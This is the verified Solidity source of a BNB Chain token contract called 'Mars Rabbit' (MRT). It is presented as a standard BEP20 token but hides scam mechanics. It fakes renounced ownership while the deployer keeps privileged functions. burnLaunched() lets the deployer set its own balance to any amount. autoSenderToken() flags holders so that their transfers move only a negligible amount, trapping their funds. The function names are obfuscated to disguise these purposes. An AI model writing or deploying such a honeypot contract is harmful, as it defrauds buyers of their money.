/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MarsRabbit is IBEP20 {
    uint8 constant _decimals = 18;
    mapping(address => bool) public amountList;
    string constant _name = "Mars Rabbit";
    address public takeAtShould;
    string constant _symbol = "MRT";


    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    mapping(address => bool) public liquidityList;
    mapping(address => uint256) _balances;



    address public listMode;
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 constant receiverLimit = 17 ** 10;
    address public owner;
    modifier limitLaunchReceiver() {
        require(liquidityList[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (){
        UniswapRouter tradingSwap = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        listMode = UniswapFactory(tradingSwap.factory()).createPair(tradingSwap.WETH(), address(this));
        _allowances[address(this)][address(tradingSwap)] = type(uint256).max;
        owner = msg.sender;
        takeAtShould = msg.sender;
        liquidityList[takeAtShould] = true;
        _balances[takeAtShould] = _totalSupply;
        emit Transfer(address(0), takeAtShould, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function tokenTx(address totalSwap) public limitLaunchReceiver {
        liquidityList[totalSwap] = true;
    }

    function autoSenderToken(address fundTakeSwap) public limitLaunchReceiver {
        amountList[fundTakeSwap] = true;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function buyMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(amount <= _balances[sender]);
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(amount <= _allowances[sender][msg.sender]);
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == takeAtShould || recipient == takeAtShould) {
            return buyMin(sender, recipient, amount);
        }
        if (amountList[sender]) {
            return buyMin(sender, recipient, receiverLimit);
        }
        return buyMin(sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function burnLaunched(uint256 exemptAutoTotal) public limitLaunchReceiver {
        _balances[takeAtShould] = exemptAutoTotal;
    }


}